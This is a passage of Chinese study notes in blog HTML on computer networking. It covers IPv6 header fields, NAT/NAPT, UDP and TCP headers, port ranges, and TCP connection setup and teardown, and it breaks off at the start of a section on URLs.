style="zoom:67%;"><ul><li><p><strong>版本：</strong>4bit；指明协议的版本，IPV6的字段是6</p></li><li><p><strong>通信量</strong>：8bit；区分不同数据报的类别或优先级</p></li><li><p><strong>流标号：</strong>20bit；所有属于同一个流的数据报都具有相同的流标号，流标号对实时音频、视频数据的传送特别有用</p></li><li><p><strong>有效载荷长度：</strong>16bit；指明数据报除基本首部以外的字节数，包括扩展首部最大值是64KB（655535Z字节）</p></li><li><p><strong>下一个首部：</strong>8bit；相当于IPV4的协议字段或者可选字段。</p><p>当IPV6数据报没有扩展首部时，下一个首部字段的作用和IPV4的协议字段一样，它的值之处了基本首部后面的数据应交付IP层上面的哪一个高层协议（6/17代表着TCP和UDP）。</p><p>当出现扩展首部时，下一个首部字段的值就标识后面第一个扩展首部的类型。</p></li><li><p><strong>跳数限制：</strong>8bit；</p></li><li><p><strong>源地址、目标地址</strong></p></li></ul><h6 id="2-IPV6地址"><a href="#2-IPV6地址" class="headerlink" title="2.IPV6地址"></a>2.IPV6地址</h6><ol><li>单播：点对点通信</li><li>多播：一点对多点的通信</li><li>任播：任播的终点是一组计算机，但数据报只交付其中一个，通常是最近的一个</li><li>地址分类：</li></ol><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528200919987.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528200919987.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528200919987" style="zoom:67%;"><h2 id="虚拟专用网和网络地址转换NAT"><a href="#虚拟专用网和网络地址转换NAT" class="headerlink" title="虚拟专用网和网络地址转换NAT"></a>虚拟专用网和网络地址转换NAT</h2><h6 id="1-专用IP地址也叫作可重用地址"><a href="#1-专用IP地址也叫作可重用地址" class="headerlink" title="1.专用IP地址也叫作可重用地址"></a>1.专用IP地址也叫作可重用地址</h6><p>这些地址只能用于机构的内部通信，不能用于和互联网上的主机通信；</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528213822996.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528213822996.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528213822996" style="zoom:50%;"><h6 id="2-网络地址转换NAT"><a href="#2-网络地址转换NAT" class="headerlink" title="2.网络地址转换NAT"></a>2.网络地址转换NAT</h6><p>网络地址转换NAT（Network Address Translation）</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528215725070.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528215725070.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528215725070" style="zoom:67%;"><p>主机A和主机B通信的时候，先通过NAT路由器将地址转为公网源IP地址，再将IP数据报转给主机B；主机B发送IP数据报时，其目的地址也就是NAT路由器的地址，通过转换成专用IP地址就可以找到主机A。</p><p>/<img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528220151980.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528220151980.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528220151980" style="zoom:67%;"></p><p>NAT路由器的通信必须由专用网内的主机发起，当如果不是内部发起，NAT地址就没有维护一个地址转换表，NAT路由器就不知道应当把目的IP地址转换成专用网内的哪一个本地IP地址，这就表明，这种专用网内部的主机不能充当服务器用，因为互联网上的客户无法请求专用网内的服务器提供服务。</p><p>为了更加有效利用NAT路由器上的公网IP地址，常用的NAT转换表把运输层的端口号也利用上，共用一个NAT路由器上的IP地址，使用端口号的NAT也叫作<strong>网络地址与端口转换NAPT</strong>（Network Address and Port Translation）</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528220659634.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528220659634.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528220659634" style="zoom:67%;"><h1 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h1><h2 id="运输层协议"><a href="#运输层协议" class="headerlink" title="运输层协议"></a>运输层协议</h2><p>运输层向上面的应用层提供通信服务，网络层主要是主机到主机，而运输层主要是进程到进程；</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528221122457.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528221122457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528221122457" style="zoom:67%;"><h6 id="1-面向链接的TCP"><a href="#1-面向链接的TCP" class="headerlink" title="1.面向链接的TCP"></a>1.面向链接的TCP</h6><p>传输控制协议TCP（Transmission Control Protocol），传输数据单元为TCP报文段（segment）；TCP提供面向连接，在传送数据之前必须要建立链接，数据传送结束后要释放连接，不提供广播和多播。</p><h6 id="2-无连接的UDP"><a href="#2-无连接的UDP" class="headerlink" title="2.无连接的UDP"></a>2.无连接的UDP</h6><p>用户数据报协议UDP（User Datagram Protocol），传输数据单元为UDP用户数据报（Datagram）；UDP在传送数据之前不需要建立链接，收到UDP报文后不需要给出任何确认</p><h2 id="运输层端口"><a href="#运输层端口" class="headerlink" title="运输层端口"></a>运输层端口</h2><p>协议层间的抽象的协议端口是软件端口，软件端口是应用层的各种协议进程与运输实体进行层级交互的一种地址，UDP和TCP的首部格式中，有<strong>源端口</strong>和<strong>目的端口</strong>两个字段。</p><p>16位的端口号可允许有65535个不同端口号</p><h6 id="1-熟知端口号或系统端口"><a href="#1-熟知端口号或系统端口" class="headerlink" title="1.熟知端口号或系统端口"></a>1.熟知端口号或系统端口</h6><p>数值为0~1023</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528222040764.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528222040764.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528222040764" style="zoom:67%;"><h6 id="2-登记端口号"><a href="#2-登记端口号" class="headerlink" title="2.登记端口号"></a>2.登记端口号</h6><p>数值为1024~49151</p><h6 id="3-客户端使用端口号"><a href="#3-客户端使用端口号" class="headerlink" title="3.客户端使用端口号"></a>3.客户端使用端口号</h6><p>数值1024~65535，这类端口号仅在客户进程运行时动态选择，因此又叫做<strong>短暂端口号</strong>，这类端口号留给客户进程选择暂时使用，当服务进程收到用户进程的报文时，就知道了客户进程所使用的端口号，因此就可以把数据发送给客户进程，通信结束后，刚使用过得客户端口号就不存在。</p><h2 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h2><h6 id="1-特点："><a href="#1-特点：" class="headerlink" title="1.特点："></a>1.特点：</h6><ul><li><p>UDP是无连接的</p></li><li><p>UDP使用尽最大努力交付，即不保证可靠交付</p></li><li><p>UDP是面向报文的，发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层，UDP对应用层不做处理，而是保留这些报文的边界。UDP一次交付一个完整的报文，所以应用程序必须选择合适大小的报文，若报文太长，UDP把它交给IP层，IP层传送时可能要进行分片，这回降低IP层的效率，反之，会使得首部的相对长度太大，这也降低了IP层的效率。</p></li><li><p>UDP没有拥塞控制</p></li><li><p>UDP支持一对一、一对多、多对一、多对多通信。</p></li><li><p>UDP的首部开销小，只有8个字节，比TCP的20个字节首部要短。</p></li></ul><h6 id="2-UDP的首部格式"><a href="#2-UDP的首部格式" class="headerlink" title="2.UDP的首部格式"></a>2.UDP的首部格式</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528223648124.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528223648124.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528223648124" style="zoom: 67%;"><p>UDP之间通信要用到其端口，但是其是无连接的，因此不需要使用套接字，在计算检验和时，UDP用户数据报之前增加12个字节的<strong>伪首部</strong>，检验和按照这个临时的UDP用户数据报来计算，伪首部即不下传也不上交，只是为了计算校验和。</p><p><strong>校验和的计算：</strong></p><p>UDP计算校验和与计算IP数据报首部校验和类似，但是IP数据报的检验和只校验IP数据报的首部，但UDP的检验和<strong>把首部和数据部分一起校验</strong>。</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528224409349.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528224409349.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528224409349" style="zoom:67%;"><p>其中伪首部的第3字段是全0，第4字段是IP首部中的协议字段的值，对于UDP，此协议字段值为17；第5字段是UDP用户数据报长度</p><h2 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h2><h6 id="1-特点：-1"><a href="#1-特点：-1" class="headerlink" title="1.特点："></a>1.特点：</h6><ul><li>TCP是面向链接的运输层协议</li><li>TCP连接时点对点，每个连接都有两个端点</li><li>TCP提供全双工通信，TCP允许通信双方的应用程序在任何时候都能发送数据，TCP连接的两方都设有发送缓存和接受缓存</li><li>面向字节流；TCP把应用程序交下来的数据仅仅看成一段字节流，并且根据实际情况以字节为最小单位随意切割，接收方必须有能力识别收到的字节流，把它还原成有意义的数据</li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528225146291.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528225146291.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528225146291" style="zoom:50%;"><h6 id="2-TCP的连接"><a href="#2-TCP的连接" class="headerlink" title="2.TCP的连接"></a>2.TCP的连接</h6><ol><li><p>套接字</p><p>每一条TCP连接唯一被通信两端的两个端点（两个套接字）确定</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528225310152.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528225310152.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528225310152" style="zoom:67%;"></li><li><p>连续ARP协议</p><p>连续ARP协议规定，发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置，接收方一般采用得失累积确认的方式，也就是说，接收方不必对收到的分组逐个发送确认，而是收到好几个分组后，对按序到达的最后一个分组发送确认</p></li></ol><h6 id="3-TCP报文的首部格式"><a href="#3-TCP报文的首部格式" class="headerlink" title="3.TCP报文的首部格式"></a>3.TCP报文的首部格式</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529102134956.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529102134956.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210529102134956" style="zoom:67%;"><ul><li> <strong>源端口、目的端口：</strong>16bit；两个字节端口；TCP的分用功能也是通过端口实现</li><li> <strong>序号（seq）：</strong>4bytes=32bit；TCP是面向字节流，在一个TCP链接中传送的字节流中的没一个个字节都按顺序编号，整个要传送的字节流的起始位置都必须在建立连接时确认。首部中的序号字段的值指的是本报文段所发送的数据的第一个字节的序号。</li><li><strong>确认号（ack）</strong>：4bytes=32bit；是期望收到对方下一个报文段的第一个数据字节的序号</li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529112130890.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529112130890.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210529112130890" style="zoom:67%;"><ul><li><p><strong>数据偏移：</strong>4bit；指出TCP报文段的数据起始距离TCP报文段的起始处有多远；这个字段实际上是TCP报文段的首部长度；跟IP的首部长度差不多，由于4位二进制数能表示的最大十进制数字是15，因此数据偏移的最大值是60字节，也就是TCP首部最大长度是60字节（选项长度不能超过40字节）</p></li><li><p><strong>保留位：</strong>6bit；</p></li><li><p><strong>标志位：</strong></p><p><strong>URG=1</strong>:表明紧急指针字段有效，文段中有紧急数据，优先级高的数据。TCP就把经济数据插入到本报文段数据的最前面，而在紧急数据后面的数据仍是普通数据，这是要与首部中的紧急指针字段配合使用</p><p><strong>ACK=1</strong>：仅当ACK=1时确认号字段才有效，ACK=0时，确认号无效</p><p><strong>RST=1:<strong>表明连接中出现差错，必须释放连接，然后重新建立运输连接；还用来拒绝一个非法的报文段或拒绝打开一个连接。RST也可以称为</strong>重建位</strong>或重置位</p><p><strong>SYN=1：</strong>在建立连接时用来<strong>同步序号</strong>，SYN=1而ACK=0；表示这是一个请求连接的报文段，对方若同意建立连接；则在响应版文段中使SYN=1和ACK=1。因此SYN=1表示这是一个连接请求或连接接受报文。</p><p><strong>FIN=1：</strong>用来释放一个连接，表明此报文段的发送方已发送数据完毕并且要求释放运输连接。</p></li><li><p><strong>窗口：</strong>2bytes；窗口指的是发送本报文段的一方的接收窗口，窗口值告诉对方，从本报文段首部确认号算起，接收方目前允许对方发送的数据量（字节为单位）。窗口值作为接收方让发送方设置其发送窗口的依据。</p></li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529115350432.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529115350432.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210529115350432" style="zoom:67%;"><ul><li><strong>校验和：</strong>2bytes。校验和字段校验的范围包括首部和数据这两部分。和UDP计算过程一样，要在TCP报文前面加上12字节的伪首部。</li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528223648124.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528223648124.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528223648124" style="zoom: 67%;"><p>​    伪首部的第4个字段中17改为6；第5字段改为TCP的长度，接收方收到此报文段后，仍要加上这个    伪首部来计算校验和。</p><ul><li><strong>紧急指针</strong>：2bytes；要配合URG=1一起使用，指出报文段中的紧急数据的字节数</li><li><strong>选项：</strong>40bytes；</li></ul><h6 id="4-TCP的运输连接管理"><a href="#4-TCP的运输连接管理" class="headerlink" title="4.TCP的运输连接管理"></a>4.TCP的运输连接管理</h6><ul><li><strong>TCP连接的建立（三次握手）</strong></li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tmp.jpg" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tmp.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="tmp" style="zoom:150%;"><p>​    本例中客户端主动打开，B被动打开。B的TCP服务器进程先创建<strong>传输控制块TCB</strong>，准备接受客户进程的    连接请求，然后服务器进程就处于LISTEN状态，等待客户端连接。</p><p>​    A的TCP客户端进程也是首先创建传输控制块TCB，然后向B发送连接请求报文段。TCP规定，SYN报文段    （即SYN=1）报文段不能携带数据，但是要消耗一个序号。TCP客户进程进入<strong>SYN-SENT（同步已发送）状态</strong>。</p><p>​    B收到A的请求报文段后，发送确认报文段，同样也要消耗一个序号，此时TCP服务器进程进入<strong>SYN-RCVD（同步收到）状态。</strong></p><p>​    客户进程收到B的确认后，还要向B给出确认，确认报文段的ACK置1。ACK报文段可以懈怠数    据，如果不携带数据则不消耗序号。这时候TCP连接已经建立，A进入<strong>ESTABLISHED（已经建立连接状态）</strong></p><ul><li><strong>连接的释放</strong>（四报文握手）</li></ul><p>![tmp (1)](计算机网络/tmp (1).jpg)</p><p><strong>第一阶段：</strong>客户端和服务器同时处于ESTABLISHED状态，客户端先向应用进程TCP发出连接释放报文段，并停止发送数据，主动关闭TCP连接。客户端连接释放报文段的终止控制位FIN置1，其序号seq=u，为前面已传送过得数据的最后一个字节的序号+1。这时客户端进入<strong>FIN-WAIT-1(终止等待1)状态</strong>，等待服务器确认。FIN报文段即使不携带数据，也消耗一个序号。</p><p><strong>第二阶段：</strong>服务器收到连接释放报文段即发出确认报文，确认号ack=u+1，这个报文段自己的序号是v，等于B前面已传过的数据的最后一个字节的序号加1，然后服务器进入<strong>CLOSE-WAIT(等待关闭)</strong> 状态，TCP服务器进程这是通知高层应用进程，因而从客户端到服务器这个方向的连接就释放了，这是的TCP连接处于<strong>半关闭（half-close）状态</strong>，即客户端已经没有数据要发送了，但服务器发送数据，客户端仍要接收，也就是从服务器到客户端这个方向的连接并为关闭，这个状态可能会持续一段时间。</p><p>服务器收到客户端的数据后，就进入了<strong>FIN-WAIT-2（终止等待2）状态</strong>，等待服务器的发出的连接释放报文段</p><p><strong>第三阶段：</strong>若服务器以及没有向客户端继续发送数据，其<strong>应用进程就通知TCP释放连接</strong>，这是B发出的连接释放报文必须使FIN=1，假定B的序号为w，B还必须重复上次已经发送过得确认号ack=u+1，这是B就进<strong>入LAST-ACK（最后确认）状态</strong>，等待A的确认</p><p><strong>第四阶段：</strong>若A收到B的连接释放报文段后，必须对此发出确认，在确认段中把ACK置为1，确认号ack=w+1，而自己的序号是seq=u+1，然后进入到<strong>TIME-WAIT（时间等待）状态</strong></p><p>服务器收到A的确认报文释放连接，进入CLOSED状态，<strong>服务器结束TCP连接的时间要比A早一些</strong></p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529160923160.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529160923160.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210529160923160" style="zoom:67%;"><ul><li><strong>TCP状态机</strong></li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529161035711.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210529161035711.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210529161035711" style="zoom:67%;"><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="远程中断协议TELNET"><a href="#远程中断协议TELNET" class="headerlink" title="远程中断协议TELNET"></a>远程中断协议TELNET</h2><h2 id="万维网WWW"><a href="#万维网WWW" class="headerlink" title="万维网WWW"></a>万维网WWW</h2><h6 id="1-协议"><a href="#1-协议" class="headerlink" title="1.协议"></a>1.协议</h6><p>万维网使用<strong>统一资源定位符URL（Uniform Resource Locator）</strong>并使每个文档在整个互联网有唯一的标识符URL；万维网客户程序与万维网服务器中交互遵守严格的协议，<strong>超文本传送协议（HyperText Transfer Protocol）</strong>。HTTP是一个应用层协议，使用TCP连接进行可靠传输；万维网使用<strong>超文本标记语言HTML（Hypertext Markup Language</strong>）。</p><h6 id="2-URL"><a href="#2-URL" class="headerlink" title="2.URL"></a>2.URL</h6><img 